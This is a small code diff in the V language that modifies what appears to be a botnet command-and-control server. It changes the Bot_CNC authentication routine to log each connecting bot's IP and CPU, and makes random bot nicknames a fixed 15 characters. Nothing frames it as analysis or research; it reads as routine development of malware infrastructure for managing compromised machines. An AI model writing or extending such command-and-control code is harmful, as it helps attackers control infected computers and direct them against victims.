@@ -87,7 +87,7 @@ pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 
 	user_addy := bot_conn.peer_addr() or { return }
 	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
-	println("Bot [${user_ip}] successfully connected.....!")
+	println("Bot [${user_ip}][${cpu}] successfully connected.....!")
 	b.add_bot_session(b.randomize_nick(), mut bot_conn, cpu, user_ip, "")
 	for {
 		data := reader.read_line() or {
@@ -124,7 +124,7 @@ pub fn (mut b Bot_CNC) parse_buffer(buff string) (string, string, []string) {
 pub fn (mut b Bot_CNC) randomize_nick() string {
 	chars := "q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m,1,2,3,4,5,6,7,8,9,0".split(",")
 	mut random_nick := ""
-	for i in 0..chars.len {
+	for i in 0..15 {
 		random_num := rand.int_in_range(0, chars.len) or { return "failed_nick" }
 		random_nick += chars[random_num]
 	}
